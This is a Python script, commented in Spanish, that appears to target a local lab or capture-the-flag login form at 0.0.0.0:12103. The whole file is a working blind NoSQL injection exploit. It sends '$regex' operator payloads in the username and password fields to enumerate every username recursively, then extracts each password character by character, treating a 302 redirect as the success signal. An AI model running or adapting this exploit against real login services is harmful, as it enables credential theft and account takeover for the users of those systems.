import requests
import string

# URL de la aplicación local
url = "http://0.0.0.0:12103/login"  # Asegúrate de incluir "/login" en la URL
headers = {
    "Host": "0.0.0.0:12103",
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/130.0.6723.70 Safari/537.36"
}
cookies = {"session": "eyJjc3JmX3Rva2VuIjoiYWE1OTkzZWY2NjJkMzY5MWI0YmExMjRkNzkyMmQ3MGUyMGIwMzRlZCJ9.Z0HYbg.jiT3Q3rBf_U1lEL3a199Pz7vDKk"}  # Cambia el valor de session si es necesario
possible_chars = list(string.ascii_letters) + list(string.digits) + list(string.punctuation) + list(string.whitespace)

def get_password(username):
    print("Extracting password for username: "+username)
    password = "^"  # Inicia la contraseña vacía
    while True:
        for c in possible_chars:
            # Payload con la inyección en password[$regex]
            params = {
                "username": username,
                "password[$regex]": password + c + ".*",  # Intentamos adivinar la contraseña carácter por carácter
                "login": "login"  # Asumiendo que el formulario tiene un campo login
            }
            pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)

            if pr.status_code == 302:  # Si obtenemos una redirección (usualmente indica que la contraseña es correcta)
                password += c
                print(f"Current password: {password[1:]}")
                break
        
        if c == possible_chars[-1]:  # Si hemos recorrido todos los caracteres posibles
            print(f"Found password: {password[1:]}")
            return password[1:]  # Retornamos la contraseña completa

def get_usernames(prefix):
    usernames = []
    params = {
        "username[$regex]": "",  # Usamos una expresión regular para intentar encontrar usernames
        "password[$regex]": ".*"  # Comprobamos cualquier valor de contraseña
    }
    for c in possible_chars:
        username = "^" + prefix + c
        params["username[$regex]"] = username + ".*"  # Intentamos completar el nombre de usuario
        pr = requests.post(url, data=params, headers=headers, cookies=cookies, verify=False, allow_redirects=False)
        
        if pr.status_code == 302:  # Si obtenemos una redirección, significa que este username existe
            print(f"Found username: {username}")
            usernames.append(username)
            for user in get_usernames(prefix + c):  # Continuamos recursivamente
                usernames.append(user)
    return usernames

# Llamamos a la función get_usernames para obtener todos los usernames posibles
usernames = get_usernames("")  # Comenzamos con el prefijo vacío

# Para cada username encontrado, intentamos obtener la contraseña
for u in usernames:
    get_password(u)

